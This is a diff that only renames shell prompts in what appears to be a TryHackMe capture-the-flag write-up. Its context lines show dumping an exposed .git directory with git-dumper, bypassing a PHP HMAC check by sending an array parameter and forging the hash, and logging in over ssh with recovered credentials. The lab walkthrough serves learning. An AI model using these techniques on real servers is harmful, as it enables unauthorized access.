@@ -44,8 +44,8 @@ The plan is we can try to dump the content of the .git repositories from webserv
 in this case, we will use `git-dumper`.
 
 ```console
-kali@kali:~/script/git-dumper$ python3 git-dumper.py http://pwd.harder.local/.git ../../THM/harder/src
-kali@kali:~/THM/harder/src$ ls
+bibo318@parrot:~/script/git-dumper$ python3 git-dumper.py http://pwd.harder.local/.git ../../THM/harder/src
+bibo318@parrot:~/THM/harder/src$ ls
 auth.php  hmac.php  index.php
 ```
 as you see, there are 3 files in git repo. after checking each one of them. `hmac.php` seem like the most juciy ones.
@@ -75,7 +75,7 @@ the problem is I not really good at `php` but it seem like if `$hm == $_GET['h']
 
 The link above discribe really clear how we can by pass this, to sum up: if `n` is an array `$secret` will equal to `false`. That mean `$hm = hash_hmac('sha256', $_GET['host'], false);`. We can generate our own `h` that is equal to `$hm` since we know exacly what how `$hm` is generated. Now open php console.
 ```console
-kali@kali:~/THM/harder/src$ php -a
+bibo318@parrot:~/THM/harder/src$ php -a
 php > $hm = hash_hmac('sha256','kurohatwashere.com',false);
 php > print($hm);
 abd809f2998ddc00e2e31cf8e8fd2a96d00ae75b71d5b413ae01fc08826f5bb5
@@ -145,7 +145,7 @@ good luck spoting the file. hint: `___.sh`. Open the file and you will find evs 
 # foot hold & root
 ssh to the victim server using the credential we got.
 ```console
-kali@kali:~/THM/harder$ ssh evs@$IP
+bibo318@parrot:~/THM/harder$ ssh evs@$IP
 Welcome to Alpine!
 
 The Alpine Wiki contains a large amount of how-to guides and general
